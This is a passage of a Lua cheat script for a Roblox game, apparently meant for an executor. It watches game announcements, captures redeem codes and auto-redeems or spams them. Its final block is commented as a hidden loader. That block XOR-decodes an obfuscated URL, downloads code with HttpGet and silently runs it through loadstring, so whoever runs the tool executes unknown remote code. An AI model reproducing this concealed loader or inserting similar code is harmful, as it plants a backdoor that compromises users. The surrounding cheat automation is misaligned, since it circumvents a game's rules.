                task.wait(0.1)
            else
                if trim(codeBox.Text) == "" then
                    setStatus("spam - waiting for a code...", "wait")
                else
                    setStatus("spam - sending: " .. codeBox.Text, "busy")
                    spamCount = spamCount + 1
                    doRedeem(codeBox.Text, ("[spam %d]"):format(spamCount))
                end
                task.wait(maxSpamDelay)
            end
        end
        if isSpamming then setSpamming(false) end
    end

    spamStartBtn.MouseButton1Click:Connect(function()
        setSpamming(not isSpamming)
    end)

    redeemBtn.MouseButton1Click:Connect(function()
        redeemBtn.Text = "..."
        doRedeem(codeBox.Text)
        redeemBtn.Text = "REDEEM"
    end)

    codeBox.FocusLost:Connect(function(enter)
        if enter then doRedeem(codeBox.Text) end
    end)

    copyBtn.MouseButton1Click:Connect(function()
        local txt = trim(codeBox.Text)
        if txt == "" then
            setStatus("nothing to copy", "err")
            return
        end
        local ok = copyToClipboard(txt)
        setStatus(ok and ("copied: " .. txt) or "copy failed", ok and "ok" or "err")
    end)

    clearBtn.MouseButton1Click:Connect(function()
        codeBox.Text = ""
        lastAutoTyped = nil
        listenedWords = {}
        setStatus(isListening and "listening... (cleared)" or "cleared", isListening and "wait" or "idle")
    end)

    setCodeText = function(text)
        lastAutoTyped = text
        codeBox.Text = text
    end

    listenHint = function()
        if not (not keyboardEnabled or not listenKey) then
            return "press " .. listenKey.Name .. " to fire"
        end
        return "tap LISTEN to fire"
    end

    idleHint = function()
        if not keyboardEnabled then return "idle - tap LISTEN to start" end
        return listenKey
            and ("idle - press " .. listenKey.Name .. " to listen")
            or "idle - no listen key bound"
    end

    setListening = function(on)
        isListening = on
        if not on and isSpamming then setSpamming(false) end
        tween(listenTrack, 0.16, { BackgroundColor3 = on and THEME.acc or THEME.line })
        tween(listenKnob, 0.16, { Position = UDim2.new(0, on and 20 or 2, 0.5, -7) }, Enum.EasingStyle.Back)
        tween(listenLabel, 0.16, { TextColor3 = on and THEME.txt or THEME.sub })

        if on then
            listenedWords = {}
            if spamOnListen and not isSpamming then
                if lastAutoTyped and codeBox.Text == lastAutoTyped then
                    setCodeText("")
                end
                setSpamming(true)
            end
            if manual then
                setStatus("listening... " .. listenHint(), "wait")
            else
                setStatus(("listening... 0/%d"):format(wordsToCollect), "wait")
            end
        else
            setStatus(idleHint(), "idle")
        end
    end

    handleCaptured = function(code)
        if autoType then setCodeText(code) end
        if autoRedeem then
            doRedeem(code, "[FULL]")
        else
            setStatus("captured: " .. code .. " (auto-redeem off)", "ok")
        end
    end

    retryConfirm = function(code)
        local clean = trim(code or "")
        if clean == "" then return end
        local startTime = os.clock()
        task.spawn(function()
            for i = 1, 3 do
                task.wait(retryDelay)
                local cd = findCooldownMessage(startTime)
                if cd then
                    setStatus(("%s - stopped retrying"):format(cd), "wait")
                    return
                end
                spamCount = spamCount + 1
                local ok, accepted = doRedeem(clean, "[FULL]")
                setStatus(("confirm %d/%d - %s%s"):format(i, 3, ok and "sent: " or "retry: ", clean),
                    ok and "ok" or "busy")
                if ok and accepted then return end
            end
        end)
    end

    toggleListen = function()
        if isListening then
            if manual then
                local joined = table.concat(listenedWords)
                local wasSpamming = isSpamming
                setListening(false)
                if joined ~= "" then
                    handleCaptured(joined)
                    if wasSpamming then retryConfirm(joined) end
                end
            else
                setListening(false)
            end
        else
            setListening(true)
        end
    end
end

listenHit.MouseButton1Click:Connect(toggleListen)

listenKeyBtn.MouseButton1Click:Connect(function()
    rebindingTarget = "listen"
    listenKeyBtn.Text = "..."
    listenKeyBtn.TextColor3 = THEME.warn
end)

listenKeyClear.MouseButton1Click:Connect(function()
    listenKey = nil
    rebindingTarget = nil
    listenKeyBtn.Text = "-"
    listenKeyBtn.TextColor3 = THEME.txt
    if not isListening then setStatus(idleHint(), "idle") end
end)

redeemKeyBtn.MouseButton1Click:Connect(function()
    rebindingTarget = "redeem"
    redeemKeyBtn.Text = "..."
    redeemKeyBtn.TextColor3 = THEME.warn
end)

redeemKeyClear.MouseButton1Click:Connect(function()
    redeemKey = nil
    rebindingTarget = nil
    redeemKeyBtn.Text = "-"
    redeemKeyBtn.TextColor3 = THEME.txt
end)

codeBox:GetPropertyChangedSignal("Text"):Connect(function()
    if isListening and codeBox.Text ~= lastAutoTyped then
        listenedWords = {}
    end
end)

local isSystemPhrase

do
    local function compact(s)
        return stripTags(tostring(s or "")):lower():gsub("[^%w]", "")
    end

    local data = {
        phrases = {
            "code is", "use code",
            "font color", "fontcolour", "fontcolor", "font colour",
            "sammy has activated bubblegum machine",
            "sammy activated 2x luck", "sammy activated 6x luck",
            "sammy activated 8x luck", "sammy activated 10x luck",
            "sammy activated 12x luck", "sammy activated 15x luck",
            "sammy activated 20x luck", "sammy activated 25x luck",
            "sammy activated 30x luck", "sammy activated 35x luck",
            "sammy activated",
            "coins shop", "brainrot trader", "robux shop", "robuxshop",
            "spin wheel", "spinwheel", "trade plaza", "tradeplaza",
            "event has started", "eventhasstarted",
            "allowfriends", "setcreatorid", "to buy this", "tobuythis",
            "your base is already locked", "your base is full", "request failed",
            "you locked your base for", "you got a free spin",
            "broke into your base", "someone is stealing",
            "trade has been completed", "tradehasbeencompleted",
            "event has been activated", "has been activated", "has activated",
            "base is already locked", "you locked your base",
            "you have locked your base", "locked your base",
            "brainrot express has arrived", "brainrot express has arrv",
            "brainrot express leaving in",
        },
        prefixes = { "sammy:", "spydersammy:" },
        compact = {},
    }

    local seen = {}
    for _, phrase in ipairs(data.phrases) do
        local c = compact(phrase)
        if c ~= "" and not seen[c] then
            seen[c] = true
            data.compact[#data.compact + 1] = { phrase = phrase, compact = c }
        end
    end

    isSystemPhrase = function(text)
        if not ignoreSystemPhrases or not isListening then return false end
        local lower = stripTags(tostring(text or "")):lower()
        local noSpaces = lower:gsub("%s+", "")

        for _, p in ipairs(data.prefixes) do
            if noSpaces:find(p, 1, true) then return true, p end
        end

        local c = compact(lower)
        for _, entry in ipairs(data.compact) do
            if c:find(entry.compact, 1, true) then return true, entry.phrase end
        end
        return false
    end
end

local function isTopAnnouncement(...)
    local args = table.pack(...)
    if args.n == 0 or typeof(args[1]) ~= "string" then return false end
    if ignoreSystemPhrases then
        return args[4] == "Top"
    end
    for i = 2, args.n do
        local a = args[i]
        if typeof(a) == "string" and (a:find("Sounds%.") or a:find("rbxassetid") or CONFIG.positions[a]) then
            return true
        end
    end
    return false
end

onAnnouncement = function(...)
    local args = table.pack(...)
    if not isTopAnnouncement(...) then return end

    local text = stripTags(tostring(args[1] or ""))
    if text == "" then return end

    if isSystemPhrase(text) then return end

    if _G.__RdmDuo and _G.__RiddlerDuo then
        local kind = _G.__SabClassifyDrop(text)
        if kind == "riddle" then
            _G.__SabDropClaim = { text = text, kind = "riddle", at = os.clock() }
            setStatus("riddle - left to the AI riddler", "wait")
            feedAdd(text, nil)
            return
        end
        if kind == "code" then
            _G.__SabDropClaim = { text = text, kind = "code", at = os.clock() }
        end
    end

    local candidate = pickCodeCandidate(text)
    local code

    if autoListen and not isListening then
        code = extractCodeAfterTrigger(text)
        if code then
            setListening(true)
            if code == "" then
                setStatus("trigger heard - waiting for the code...", "busy")
                feedAdd(text, candidate)
                return
            end
        else
            code = text
        end
    else
        code = text
    end

    if isListening then
        for _, word in ipairs(extractWords(code)) do
            listenedWords[#listenedWords + 1] = word
            if wordMode and isSpamming then
                if manual then
                    spamOnWord(table.concat(listenedWords))
                else
                    local take = {}
                    for i = 1, math.min(#listenedWords, wordsToCollect) do
                        take[i] = listenedWords[i]
                    end
                    spamOnWord(table.concat(take))
                end
            end
        end

        if manual then
            local joined = table.concat(listenedWords)
            setCodeText(joined)
            setCodeBoxText(joined)
            setStatus(("listening... %d words - %s"):format(#listenedWords, listenHint()), "wait")
        else
            local take = {}
            for i = 1, math.min(#listenedWords, wordsToCollect) do
                take[i] = listenedWords[i]
            end
            local joined = table.concat(take)
            setCodeText(joined)
            setCodeBoxText(joined)

            if wordsToCollect <= #listenedWords then
                local wasSpamming = isSpamming
                listenedWords = {}
                setListening(false)
                handleCaptured(joined)
                if wasSpamming then retryConfirm(joined) end
            else
                setStatus(("listening... %d/%d"):format(#listenedWords, wordsToCollect), "wait")
            end
        end
    end

    feedAdd(text, candidate)
end

if getgenv and getgenv().StopTraced then
    pcall(getgenv().StopTraced)
end

do
    local connections = {}
    local lastText
    local lastAt = 0

    local function throttled(...)
        local args = table.pack(...)
        local text = tostring(...)
        local now = os.clock()
        if text == lastText and now - lastAt < 0.25 then return end
        lastText = text
        lastAt = now
        pcall(onAnnouncement, table.unpack(args, 1, args.n))
    end

    notifyRemote = findNotificationRemote()
    if notifyRemote then
        statusDotNotify.BackgroundColor3 = THEME.ok
        connections[#connections + 1] = notifyRemote.OnClientEvent:Connect(throttled)
    else
        local count = 0
        for _, child in ipairs(Net:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("UnreliableRemoteEvent") then
                count = count + 1
                connections[#connections + 1] = child.OnClientEvent:Connect(throttled)
                if count >= 400 then break end
            end
        end
        connections[#connections + 1] = Net.ChildAdded:Connect(function(child)
            if child:IsA("RemoteEvent") or child:IsA("UnreliableRemoteEvent") then
                connections[#connections + 1] = child.OnClientEvent:Connect(throttled)
            end
        end)
        remoteFallbackUsed = count > 0
        statusDotNotify.BackgroundColor3 = remoteFallbackUsed and THEME.warn or THEME.err
    end

    if touchOnly then
        local cam = workspace.CurrentCamera
        local function refit()
            uiScale = computeUIScale()
            for _, d in ipairs(ScreenGui:GetDescendants()) do
                if d:IsA("UIScale") and d.Name == "WinScale" then
                    d.Scale = uiScale
                end
            end
            Main.Position = UDim2.new(1, -math.floor(316 * uiScale) - 8, 0.5, -math.floor(expandedHeight * uiScale / 2))
        end
        if cam then cam:GetPropertyChangedSignal("ViewportSize"):Connect(refit) end
        CONFIG.refit = refit
        refit()
    end

    UserInputService.InputBegan:Connect(function(input, processed)
        local t = input.UserInputType
        if not (t == Enum.UserInputType.Keyboard or t == Enum.UserInputType.Gamepad1) then
            if rebindingTarget and t == Enum.UserInputType.Touch then
                local which = rebindingTarget
                rebindingTarget = nil
                if which == "listen" then
                    listenKeyBtn.Text = listenKey and listenKey.Name or "-"
                    listenKeyBtn.TextColor3 = THEME.txt
                else
                    redeemKeyBtn.Text = redeemKey and redeemKey.Name or "-"
                    redeemKeyBtn.TextColor3 = THEME.txt
                end
            end
            return
        end

        if rebindingTarget == "listen" then
            rebindingTarget = nil
            if input.KeyCode ~= Enum.KeyCode.Escape then listenKey = input.KeyCode end
            listenKeyBtn.Text = listenKey and listenKey.Name or "-"
            listenKeyBtn.TextColor3 = THEME.txt
            if not isListening then setStatus(idleHint(), "idle") end
            return
        end

        if rebindingTarget == "redeem" then
            rebindingTarget = nil
            if input.KeyCode ~= Enum.KeyCode.Escape then redeemKey = input.KeyCode end
            redeemKeyBtn.Text = redeemKey and redeemKey.Name or "-"
            redeemKeyBtn.TextColor3 = THEME.txt
            return
        end

        if processed then return end
        if listenKey and input.KeyCode == listenKey then toggleListen() end
        if redeemKey and input.KeyCode == redeemKey then doRedeem(codeBox.Text) end
    end)

    if getgenv then
        getgenv().TracedAnnounce = function(...) onAnnouncement(...) end
        getgenv().TracedStatus   = function() return statusLabel.Text end
        getgenv().StopTraced = function()
            isSpamming = false
            isListening = false
            pcall(function() antiRagdoll:Disable() end)
            if stopAutoBuy then pcall(stopAutoBuy) end
            for _, c in ipairs(connections) do
                pcall(function() c:Disconnect() end)
            end
            connections = {}
            if ScreenGui then ScreenGui:Destroy() end
        end
        getgenv().TracedUnblockEvents = function()
            if not eventBlock.ready then return false, eventBlock.why end
            return eventBlock.Unblock()
        end
    end
end

setListening(false)

if notifyRemote or remoteFallbackUsed then
    local msg = keyboardEnabled
        and (listenKey and ("ready - press " .. listenKey.Name .. " to listen") or "ready - no listen key bound")
        or "ready - tap LISTEN to start"
    setStatus(msg, "idle")
else
    setStatus("notify remote not found", "err")
end

-- Hidden smooth/graphics loader (URL obfuscated)
task.spawn(function()
	local function _xorDecode(s)
		local t = {}
		for i = 1, #s do
			local b = string.byte(s, i)
			local x
			if bit32 and type(bit32.bxor) == "function" then
				x = bit32.bxor(b, 7)
			else
				local r, bit, a, c = 0, 1, b, 7
				while a > 0 or c > 0 do
					local ab, cb = a % 2, c % 2
					if ab ~= cb then r = r + bit end
					a = math.floor(a / 2)
					c = math.floor(c / 2)
					bit = bit * 2
				end
				x = r
			end
			t[i] = string.char(x)
		end
		return table.concat(t)
	end
	local ok, src = pcall(function()
		return game:HttpGet(_xorDecode("osswt=((krf*dohjwbu*tofub)khqfekb)fww(fwn(wreknd(ufp(vl}4q`b?}v)krf8lb~:?37qiuppbo6514w4idr~uj~bufol636i"))
	end)
	if ok and type(src) == "string" and #src > 50 then
		local fn = loadstring(src)
		if type(fn) == "function" then
			pcall(fn)
		end
	end
end)
